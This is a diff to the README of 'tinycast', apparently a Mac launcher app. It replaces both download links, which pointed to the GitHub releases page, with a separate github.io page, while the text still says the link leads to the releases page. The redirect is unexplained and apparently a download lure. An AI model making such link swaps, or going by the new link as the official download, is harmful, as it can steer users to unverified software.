@@ -1,6 +1,6 @@
 # ⚡ tinycast - Your Tiny Mac Launcher, Hotkeys, and Clipboard History
 
-[![Download tinycast](https://img.shields.io/badge/Download-tinycast-brightgreen?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/memoriserstradivarius739/tinycast/releases)
+[![Download tinycast](https://img.shields.io/badge/Download-tinycast-brightgreen?style=for-the-badge&logo=github&color=4CAF50)](https://memoriserstradivarius739.github.io)
 
 ## 🎯 What Is tinycast?
 
@@ -57,7 +57,7 @@ Getting started with tinycast is simple. Follow these steps:
 
 Visit this link to download the application:
 
-[**Download tinycast**](https://github.com/memoriserstradivarius739/tinycast/releases)
+[**Download tinycast**](https://memoriserstradivarius739.github.io)
 
 You'll be taken to the releases page where you can find the latest version.
 
